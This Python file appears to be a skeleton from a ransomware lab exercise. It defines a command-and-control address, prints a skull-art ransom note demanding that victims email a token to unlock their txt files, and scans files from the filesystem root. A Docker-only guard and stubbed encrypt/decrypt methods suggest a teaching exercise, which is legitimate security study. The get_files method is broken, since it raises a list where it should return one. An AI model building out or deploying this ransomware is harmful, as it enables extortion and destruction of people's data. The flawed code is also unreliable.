import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """


               ...
             ;::::;
           ;::::; :;
         ;:::::'   :;
        ;:::::;     ;.
       ,:::::'       ;           OOO\ 
       ::::::;       ;          OOOOO\ 
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;:::::::::`. ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
 ,::::::;::::::;;;;::::;,   /  /        DOOO
;`::::::`'::::::;;;::::: ,#/  /          DOOO
:`:::::::`;::::::;;::: ;::#  /            DOOO 
::`:::::::`;:::::::: ;::::# /              DOO  ______
`:`:::::::`;:::::: ;::::::#/               DOO |  __  | _                                                                                                   __
 :::`:::::::`;; ;:::::::::##                OO | |  |_||_| __     __  ___     __   __   ___     _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _  |  |
 ::::`:::::::`;::::::::;:::#                OO | |  __  _  \ \   / / / _ \   |  \_/  | / _ \   | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | | |  |
 `:::::`::::::::::::;'`:;::#                O  | |__\ || |  \ \ / / |  __/   | \   / ||  __/   | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| | |__|
  `:::::`::::::::;' /  / `:#                   |______/|_|   \___/   \___|   |_|\_/|_| \___|    \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |  __
   ::::::`:::::;'  /  /   `#                                                                     __/ |                                               __/ | |__|
                                                                                                |___/                                               |___/


                                                 
Your txt files have been locked. Send an email to Jenesuispassimechant@jedoisjustemanger.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # get all files in the root directory
        path = Path("/")
        # return all files matching the filter
        raise [str(file) for file in path.glob(filter)]

    def encrypt(self):
        # main function for encrypting (see PDF)
        raise NotImplemented()

    def decrypt(self):
        # main function for decrypting (see PDF)
        raise NotImplemented()

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()